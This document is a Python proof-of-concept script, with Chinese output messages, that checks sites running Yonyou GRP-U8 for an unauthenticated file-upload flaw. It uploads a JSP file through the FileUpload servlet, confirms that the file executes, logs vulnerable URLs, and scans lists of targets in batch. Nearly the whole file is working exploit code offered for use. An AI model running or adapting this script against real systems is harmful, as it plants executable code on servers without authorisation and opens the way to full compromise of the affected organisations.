import sys
import requests
import argparse

def checkVuln(url):
    vulnurl = url + "/servlet/FileUpload?fileName=1.jsp&actionID=update"
    okurl = url + "/R9iPortal/upload/1.jsp"
    data = """<% out.println("66666666666");%>"""

    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
               'Content-Type': 'multipart/form-data; boundary=---------------------------32840991842344344364451981273'
               }
    try:
        response = requests.get(vulnurl, headers=headers, data=data, timeout=5, verify=False)
        if response.status_code == 200:
            if '66666666666' in requests.get(okurl, headers=headers, timeout=5, verify=False).text:
                print(f"【+】{url}存在漏洞！！！")
                with open("vuln.txt", "a+") as f:
                    f.write(okurl + "\n")
            else:
                print("【-】目标网站未检测到漏洞...")
        else:
            print("【-】目标网站未检测到漏洞...")
    except Exception as e:
        print("【-】目标网址网络链接存在问题...")

def batchCheck(filename):
    with open(filename, "r") as f:
        for readline in f.readlines():
            checkVuln(readline)

def banner():
    bannerinfo = """                                                                                                                          
 ____  ____  ____  ____   ______  _______     _______        _____  _____   ____    
|_  _||_  _||_  _||_  _|.' ___  ||_   __ \   |_   __ \      |_   _||_   _|.' __ '.  
  \ \  / /    \ \  / / / .'   \_|  | |__) |    | |__) |______ | |    | |  | (__) |  
   \ \/ /      \ \/ /  | |   ____  |  __ /     |  ___/|______|| '    ' |  .`____'.  
   _|  |_      _|  |_  \ `.___]  |_| |  \ \_  _| |_            \ \__/ /  | (____) | 
  |______|    |______|  `._____.'|____| |___||_____|            `.__.'   `.______.'    """
    print(bannerinfo)
    print("YYGRP-U8".center(83, '*'))
    print(f"[+]{sys.argv[0]} --url http://www.xxx.com 可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} --file yongyouUrl.txt 可对txt文档中的网站进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看更多详细帮助信息")

def main():
    parser = argparse.ArgumentParser(description='GRP-U8-UploadFile漏洞单批检测脚本')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    args = parser.parse_args()
    if args.url:
        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()

if __name__ == '__main__':
    main()